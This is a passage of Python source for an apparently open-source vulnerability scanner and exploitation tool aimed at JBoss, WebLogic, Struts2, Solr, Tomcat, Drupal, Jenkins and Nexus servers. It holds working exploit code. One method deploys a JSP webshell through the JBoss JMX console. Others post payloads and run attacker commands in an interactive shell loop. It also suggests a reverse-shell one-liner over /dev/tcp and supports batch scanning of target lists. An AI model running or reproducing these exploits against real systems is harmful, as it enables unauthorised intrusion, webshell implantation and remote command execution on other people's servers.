        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
        self.pocname = "RedHat JBoss: CVE-2010-0738"
        self.info = color.de() + color.green(" [jmx-console]")
        self.path = "/jmx-console/HtmlAdaptor"
        self.rawdata = "null"
        self.r = "PoCWating"
        self.method = "head"
        self.data = ":-)"
        self.poc = ("?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName="
            "store&argType=java.lang.String&arg0=shells.war&argType=java.lang.String&arg1=shells&argType=java"
            ".lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + self.data + "&argType=boolean&arg4=True")
        self.exp = ("?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName="
            "store&argType=java.lang.String&arg0=" + self.name + ".war&argType=java.lang.String&arg1="+self.name+"&argType=java"
            ".lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + self.jsp_webshell + "&argType=boolean&arg4=True")
        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "keep-alive"}
        try:
            if VULN is None:
                self.request = requests.head(self.url + self.path + self.poc , headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.request = requests.get(self.url + "/shells/shells.jsp", headers=self.headers, timeout=TIMEOUT, verify=False)
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.head(self.url + self.path + self.exp , headers=self.headers, timeout=TIMEOUT, verify=False)
                self.jsp = ">>> " + self.url + "/" + self.name + "/" + self.name + ".jsp" + "?pwd=password&cmd=" + CMD
                verify.generic_output(self.jsp, self.pocname, self.method, self.rawdata, self.info)
        except socket.timeout as error:
            verify.timeout_output(self.pocname)
        except Exception as error:
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        
    # 2020-09-24
    def cve_2010_1428(self):
        self.pocname = "RedHat JBoss: CVE-2010-1428"
        self.info = color.de() + color.green(" [web-console]")
        self.path = "/web-console/Invoker"
        self.rawdata = "null"
        self.r = "PoCWating"
        self.method = "head"
        self.data = ":-)"
        try:
            if VULN is None:
                self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                if r"WWW-Authenticate" in self.request.headers:
                    self.r = "PoCSuCCeSS"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.head(self.url + self.path, data=self.payload_cve_2010_1428, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.cmd = urlencode({"ppp": CMD})
                self.request = requests.get(self.url + "/jexws4/jexws4.jsp?" + self.cmd, headers=self.headers, timeout=TIMEOUT, verify=False)
                time.sleep(2)
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except socket.timeout as error:
            verify.timeout_output(self.pocname)
        except Exception as error:
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            
    # 2020-09-23 RedHat JBoss: CVE-2015-7501, JMXInvokerServlet
    def cve_2015_7501(self):
        self.pocname = "RedHat JBoss: CVE-2015-7501"
        self.info = color.de() + color.green(" [JMXInvokerServlet]")
        self.path = "/invoker/JMXInvokerServlet"
        self.rawdata = ">_< There are no requests and responses for special reasons"
        self.r = "PoCWating"
        self.method = "head"
        self.data = ":-)"
        try:
            if VULN is None:
                self.request = requests.head(self.url + self.path, data=self.data, headers=self.headers)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                if self.request.status_code == 200 or 401 and r"jboss" in self.request.headers["Content-Type"]:
                    self.r = "PoCSuCCeSS"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.payload_cve_2015_7501, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.cmd = urlencode({"ppp": CMD})
                self.request = requests.get(self.url + "/jexinv4/jexinv4.jsp?" + self.cmd, headers=self.headers, timeout=TIMEOUT, verify=False)
                time.sleep(2)
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except socket.timeout as error:
            verify.timeout_output(self.pocname)
        except Exception as error:
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            
# 漏洞验证方法
class Start(object):
    def output(url):
        if RUNALLPOC is not True:
            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(url)))
            if OUTPUT is not None:
                print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
                verify.file_output("########## " + str(url) + " ##########")
                
    def onepoc_output(self):
        if RUNALLPOC == True:
            pass
        else:
            print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended"))
    def allvulnscan(self):
        print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(self)))
        print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Use all vuln poc"))
        Start.apache_solr(self)
        Start.apache_strtus2(self)
        Start.apache_tomcat(self)
        Start.drupal(self)
        Start.jenkins(self)
        Start.nexus(self)
        Start.oracle_weblogic(self)
        Start.redhat_jboss(self)
        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended"))
    def apache_solr(self):
        Start.output(self)
        PocApacheSolr=ApacheSolr(self)
        PocApacheSolr.cve_2017_12629()
        PocApacheSolr.cve_2019_0193()
        PocApacheSolr.cve_2019_17558()
        Start.onepoc_output(self)
    def apache_strtus2(self):
        Start.output(self)
        PocApacheStruts2=ApacheStruts2(self)
        PocApacheStruts2.s2_005()
        PocApacheStruts2.s2_008()
        PocApacheStruts2.s2_009()
        PocApacheStruts2.s2_013()
        PocApacheStruts2.s2_015()
        PocApacheStruts2.s2_016()
        PocApacheStruts2.s2_029()
        PocApacheStruts2.s2_032()
        PocApacheStruts2.s2_045()
        PocApacheStruts2.s2_046()
        PocApacheStruts2.s2_048()
        PocApacheStruts2.s2_052()
        PocApacheStruts2.s2_057()
        PocApacheStruts2.s2_059()
        PocApacheStruts2.s2_devMode()
        Start.onepoc_output(self)
    def apache_tomcat(self):
        Start.output(self)
        PocApacheTomcat=ApacheTomcat(self)
        PocApacheTomcat.tomcat_examples()
        PocApacheTomcat.cve_2017_12615()
        PocApacheTomcat.cve_2020_1938()
        Start.onepoc_output(self)
    def drupal(self):
        Start.output(self)
        PocDrupal = Drupal(self)
        PocDrupal.cve_2018_7600()
        PocDrupal.cve_2018_7602()
        PocDrupal.cve_2019_6340()
        Start.onepoc_output(self)
    def jenkins(self):
        Start.output(self)
        PocJenkins = Jenkins(self)
        PocJenkins.cve_2017_1000353()
        PocJenkins.cve_2018_1000861()
        Start.onepoc_output(self)
    def nexus(self):
        Start.output(self)
        PocNexus=Nexus(self)
        PocNexus.cve_2019_7238()
        # PocNexus.cve_2020_10199()
        Start.onepoc_output(self)
    def oracle_weblogic(self):
        Start.output(self)
        PocOracleWeblogic=OracleWeblogic(self)
        PocOracleWeblogic.cve_2014_4210()
        PocOracleWeblogic.cve_2017_3506()
        PocOracleWeblogic.cve_2017_10271()
        PocOracleWeblogic.cve_2018_2894()
        PocOracleWeblogic.cve_2019_2725()
        PocOracleWeblogic.cve_2019_2729()
        PocOracleWeblogic.cve_2020_2551()
        Start.onepoc_output(self)
    def redhat_jboss(self):
        Start.output(self)
        PocRedHatJBoss = RedHatJBoss(self)
        PocRedHatJBoss.cve_2010_0738()
        PocRedHatJBoss.cve_2010_1428()
        PocRedHatJBoss.cve_2015_7501()

    def exploit(self, vuln):
        global VULN
        VULN = vuln
        global CMD
        ExpApacheSolr = ApacheSolr(self)
        ExpApacheTomcat = ApacheTomcat(self)
        ExpApacheStruts2 = ApacheStruts2(self)
        ExpDrupal = Drupal(self)
        ExpJenkins = Jenkins(self)
        ExpNexus = Nexus(self)
        ExpOracleWeblogic = OracleWeblogic(self)
        ExpRedHatJBoss = RedHatJBoss(self)
        print (now.timed(de=DELAY)+color.yeinfo()+color.cyan(" Target url: "+str(self)))
        print (now.timed(de=DELAY)+color.yeinfo()+color.cyan(" Use exploit modules: "+VULN))
        # RCE
        while True:
            if VULN == "CVE-2018-7602":
                drupal_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
                drupal_p = input(now.timed(de=DELAY) + color.green("[+] Input password: "))
                while True:
                    CMD = input(now.timed(de=DELAY) + color.green("[+] Shell >>> "))
                    if CMD == "exit" or CMD == "quit" or CMD == "bye": exit(0)
                    global DRUPAL_U
                    DRUPAL_U = drupal_u
                    global DRUPAL_P
                    DRUPAL_P = drupal_p
                    ExpDrupal.cve_2018_7602()
            # Apache Tomcat CVE-2020-1938 File reading
            elif VULN=="CVE-2020-1938":
                print (now.timed(de=DELAY)+color.yeinfo()+color.yellow(" Examples: WEB-INF/web.xml"))
                CMD = input(now.timed(de=DELAY)+color.green("[+] File >>> "))
                if CMD == "exit" or CMD == "quit" or CMD == "bye": 
                    exit(0)
                global CVE20201938
                CVE20201938 = CMD
                ExpApacheTomcat.cve_2020_1938()
            elif VULN == "CVE-2020-10199":
                nexus_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
                nexus_p = input(now.timed(de=DELAY) + color.green("[+] Input password: "))
                while True:
                    CMD = input(now.timed(de=DELAY) + color.green("[+] Shell >>> "))
                    if CMD == "exit" or CMD == "quit" or CMD == "bye": exit(0)
                    global NEXUS_U
                    NEXUS_U = nexus_u
                    global NEXUS_P
                    NEXUS_P = nexus_p
                    ExpNexus.cve_2020_10199()
            else:
                CMD = input(now.timed(de=DELAY)+color.green("[+] Shell >>> "))
                if CMD == "exit" or CMD == "quit" or CMD == "bye": 
                    exit(0)
                
                # Apache Solr =============================
                if VULN=="CVE-2017-12629":
                    ExpApacheSolr.cve_2017_12629()
                if VULN=="CVE-2019-17558":
                    ExpApacheSolr.cve_2019_17558()
                if VULN=="CVE-2019-0193":
                    ExpApacheSolr.cve_2019_0193()
                # Apache Struts2 ==========================
                if VULN=="S2-005":
                    ExpApacheStruts2.s2_005()
                if VULN=="S2-008":
                    ExpApacheStruts2.s2_008()
                if VULN=="S2-009":
                    ExpApacheStruts2.s2_009()
                if VULN=="S2-013":
                    ExpApacheStruts2.s2_013()
                if VULN=="S2-015":
                    ExpApacheStruts2.s2_015()
                if VULN=="S2-016":
                    ExpApacheStruts2.s2_016()
                if VULN=="S2-029":
                    ExpApacheStruts2.s2_029()
                if VULN=="S2-032":
                    ExpApacheStruts2.s2_032()
                if VULN=="S2-045":
                    ExpApacheStruts2.s2_045()
                if VULN=="S2-046":
                    ExpApacheStruts2.s2_046()
                if VULN=="S2-048":
                    ExpApacheStruts2.s2_048()
                if VULN == "S2-052":
                    ExpApacheStruts2.s2_052()
                if VULN == "S2-057":
                    ExpApacheStruts2.s2_057()
                if VULN == "S2-059":
                    ExpApacheStruts2.s2_059()
                if VULN == "S2-devMode":
                    ExpApacheStruts2.s2_devMode()
                # Apache Tomcat ===========================
                if VULN=="CVE-2017-12615":
                    ExpApacheTomcat.cve_2017_12615()
                # Drupal ==================================
                if VULN == "CVE-2018-7600":
                    ExpDrupal.cve_2018_7600()
                if VULN == "CVE-2019-6340":
                    ExpDrupal.cve_2019_6340()
                # Jenkins =================================
                if VULN == "CVE-2018-1000861":
                    ExpJenkins.cve_2018_1000861()
                # Nexus ===================================
                #if VULN == "CVE-2019-7238":
                #    ExpNexus.cve_2019_7238()
                if VULN == "CVE-2020-10199":
                    ExpNexus.cve_2020_10199()
                # Oracle Weblogic =========================
                if VULN=="CVE-2017-3506":
                    ExpOracleWeblogic.cve_2017_3506()
                if VULN == "CVE-2017-10271":
                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" input \"nc\" bounce linux shell"))
                    ExpOracleWeblogic.cve_2017_10271()
                if VULN=="CVE-2018-2894":
                    ExpOracleWeblogic.cve_2018_2894()
                if VULN=="CVE-2019-2725":
                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" input \"nc\" bounce linux shell"))
                    ExpOracleWeblogic.cve_2019_2725()
                if VULN=="CVE-2019-2729":
                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" input \"nc\" bounce linux shell"))
                    ExpOracleWeblogic.cve_2019_2729()
                # RedHat JBoss ============================
                if VULN == "CVE-2010-0738":
                    ExpRedHatJBoss.cve_2010_0738()
                if VULN == "CVE-2010-1428":
                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" nc shell: \"bash -i >&/dev/tcp/192.168.1.2/9999 0>&1\""))
                    ExpRedHatJBoss.cve_2010_1428()
                if VULN == "CVE-2015-7501":
                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" nc shell: \"bash -i >&/dev/tcp/192.168.1.2/9999 0>&1\""))
                    ExpRedHatJBoss.cve_2015_7501()
                
class Target:
    def allvuln_url(self):
        Start.allvulnscan(self)
    def allvuln_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                else:
                    print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" ========== Batch target =========="))
                Start.apache_solr(furl)
                Start.apache_strtus2(furl)
                Start.apache_tomcat(furl)
                Start.oracle_weblogic(furl)
        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Batch scan completed and ended"))
    # Apache Solr =============================================================
    def apache_solr_url(self):
        Start.apache_solr(self)
    def apache_solr_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.apache_solr(furl)
    # Apache Struts2 ======================================
    def apache_struts2_url(self):
        Start.apache_strtus2(self)
    def apache_struts2_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.apache_strtus2(furl)
    # Apache Tomcat =======================================
    def apache_tomcat_url(self):
        Start.apache_tomcat(self)
    def apache_tomcat_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.apache_tomcat(furl)
    # Drupal ==============================================
    def drupal_url(self):
        Start.drupal(self)
    def drupal_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.drupal(furl)
    # Jenkins =============================================
    def jenkins_url(self):
        Start.jenkins(self)
    def jenkins_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.jenkins(furl)
    # Nexus ===============================================
    def nexus_url(self):
        Start.nexus(self)
    def nexus_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.nexus(furl)
    # Oracle Weblogic ====================================
    def oracle_weblogic_url(self):
        Start.oracle_weblogic(self)
    def oracle_weblogic_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.oracle_weblogic(furl)
    # Oracle Weblogic ====================================
    def redhat_jboss_url(self):
        Start.redhat_jboss(self)
    def redhat_jboss_file(self):
        with open(self) as f:
            while True:
                furl = f.readline()
                furl = furl.strip('\r\n')
                if not furl:
                    break
                Start.redhat_jboss(furl)
    
def version():
    version = "0.1"
    github_ver_url = "https://github.com/zhzyker/vulmap/blob/main/version"      
    try:
        github_ver_request = requests.get(url=github_ver_url, timeout=5)
        version_res = r'blob-code blob-code-inner js-file-line">(.*)</td>'
        github_ver = re.findall(version_res,github_ver_request.text,re.S|re.M)[0]
        if version == github_ver:
            print (now.timed(de=0) + color.yeinfo() + color.yellow(" Currently the latest version: " + version))
        elif version < github_ver:
            print (now.timed(de=0) + color.rewarn() + color.red(" The current version is: " + version + ", Latest version: " + github_ver))
            print (now.timed(de=0) + color.rewarn() + color.red(" Go to github https://github.com/zhzyker/vulmap update"))
        else:
            print (now.timed(de=0) + color.rewarn() + color.red(" Unknown version: " + version))
    except:
        print(now.timed(de=0) + color.rewarn() + color.red(" The current version is: " + version + ", Version check filed"))
    
                
def cmdlineparser(argv=None):
    print(color.yellow("""                   __
                  [  |                              
  _   __  __   _   | |  _ .--..--.   ,--.  _ .--.   
 [ \ [  ][  | | |  | | [ `.-. .-. | `'_\ :[ '/'`\ \ 
  \ \/ /  | \_/ |, | |  | | | | | | // | |,| \__/ | 
   \__/   '.__.'_/[___][___||__||__]\'-;__/| ;.___/  
                                          [__|"""))
    parser = argparse.ArgumentParser(usage="python3 vulmap [options]")
    # target option
    target = parser.add_argument_group("Target", "You must use the -u option to specify a target, usually https://example.com or http://example.com:443  Use -u to check one target, use -f to batch check")
    target.add_argument("-u", "--url",
                        dest="url",
                        type=str,
                        help=" Target URL (e.g. -u \"http://example.com\")")
    target.add_argument("-f", "--file",
                        dest="file",
                        help="Select a target list file, and the url must be distinguished by lines (e.g. -f \"/home/user/list.txt\")")
    # poc or exp , target is tomcat or struts
    mode = parser.add_argument_group("Mode", "Support vulnerability scanning mode and vulnerability exploitation mode, namely \"poc\" and \"exp\"")
    mode.add_argument("-m", "--mode",
                      dest="mode",
                      type=str,
                      help="The mode supports \"poc\" and \"exp\", you can omit this option, and enter poc mode by default")
    mode.add_argument("-a", "--app",
                      dest="app",
                      type=str,
                      help="Specify a web app or cms (e.g. -a \"weblogic\"). default scan all")
    mode.add_argument("-c", "--cmd",
                      dest="cmd",
                      type=str,
                      default="netstat -an",
                      help="Custom RCE vuln command, Other than \"netstat -an\" and \"id\" can affect program judgment. defautl is \"netstat -an\"")
    mode.add_argument("-v", "--vuln",
                      dest="vuln",
                      type=str,
                      default=None,
                      help="Exploit, Specify the vuln number (e.g. -v \"CVE-2020-2729\")")
    mode.add_argument("--list",
                      dest="list",
                      action='store_false',
                      help="Displays a list of vulnerabilities that support scanning")
    mode.add_argument("--debug",
                      dest="debug",
                      action='store_false',
                      help="Debug mode echo request and responses")
                      
    # time and delay
    time = parser.add_argument_group("Time", "Check time options")
    time.add_argument("--delay",
                      dest="delay",
                      type=int,
                      default=0,
                      help="Delay check time, default 0s")
    time.add_argument("--timeout",
                      dest="TIMEOUT",
                      type=int,
                      default=10,
                      help="Scan timeout time, default 10s")
    # output 
    output = parser.add_argument_group("Output", "Poc mode scan result export")
    output.add_argument("--output",
                        dest="OUTPUT",
                        type=str,
                        default=None,
                        metavar='FILE',
                        help="Text mode export (e.g. -o \"result.txt\")")
    example = parser.add_argument_group("Example")
    example.add_argument(dest="python3 vulmap.py -u http://example.com\n  "
                              "python3 vulmap.py -u http://example.com -a struts2\n  "
                              "python3 vulmap.py -u http://example.com:7001 -m poc -a weblogic --delay 1 --timeout 15\n  "
                              "python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729\n  "
                              "python3 vulmap.py -f list.txt -o results.txt",
                         action='store_false')
    args = parser.parse_args()
    version()
    global VULN
    VULN = args.vuln
    global DEBUG
    DEBUG = None
    global DELAY
    DELAY = args.delay
    global TIMEOUT
    TIMEOUT = args.TIMEOUT
    global OUTPUT
    OUTPUT = args.OUTPUT
    global CMD
    CMD = args.cmd
    global RUNALLPOC
    RUNALLPOC = False



    if args.list is False:
        print(now.timed(de=0) + color.yeinfo() + color.yellow(" List of supported vulnerabilities"))
        print(vulnlist)
    if args.vuln is not None:
        args.mode = "exp"
    if CMD != "netstat -an":
        print (now.timed(de=DELAY)+color.rewarn()+color.red(" Custom command mode, cannot detect normally, please check manually"))
    if args.mode==None or args.mode=="poc":
        if args.debug is False:
            print (now.timed(de=DELAY)+color.yeinfo()+color.cyan(" Use debug mode... ..."))
            DEBUG = "debug"
        if args.url is not None and args.file is None:
            if args.url[-1] == "/":
                args.url = args.url[:-1]
            if args.app==None:
                RUNALLPOC = True
                Target.allvuln_url(args.url)
            elif args.app=="solr":
                Target.apache_solr_url(args.url)
            elif args.app=="struts2":
                Target.apache_struts2_url(args.url)
            elif args.app=="tomcat":
                Target.apache_tomcat_url(args.url)
            elif args.app == "drupal":
                Target.drupal_url(args.url)
            elif args.app == "jenkins":
                Target.jenkins_url(args.url)
            elif args.app == "weblogic":
                Target.oracle_weblogic_url(args.url)
            elif args.app == "nexus":
                Target.nexus_url(args.url)
            elif args.app == "jboss":
                Target.redhat_jboss_url(args.url)
        elif args.file is not None and args.url is None:
            if args.app==None:
                RUNALLPOC = True
                Target.allvuln_file(args.file)
            elif args.app=="solr":
                Target.apache_solr_file(args.file)
            elif args.app=="struts2":
                Target.apache_struts2_file(args.file)
            elif args.app == "tomcat":
                Target.apache_tomcat_file(args.file)
            elif args.app == "drupal":
                Target.drupal_file(args.file)
            elif args.app == "jenkins":
                Target.jenkins_file(args.file)
            elif args.app=="weblogic":
                Target.oracle_weblogic_file(args.file)
            elif args.app == "nexus":
                Target.nexus_file(args.file)
            elif args.app == "jboss":
                Target.redhat_jboss_file(args.file)
    elif VULN is not None or args.mode=="exp":
        Start.exploit(args.url, args.vuln)
    else:
        print(now.timed(de=0) + color.rewarn() + color.red(" Options error ... ..."))
cmdlineparser(sys.argv)
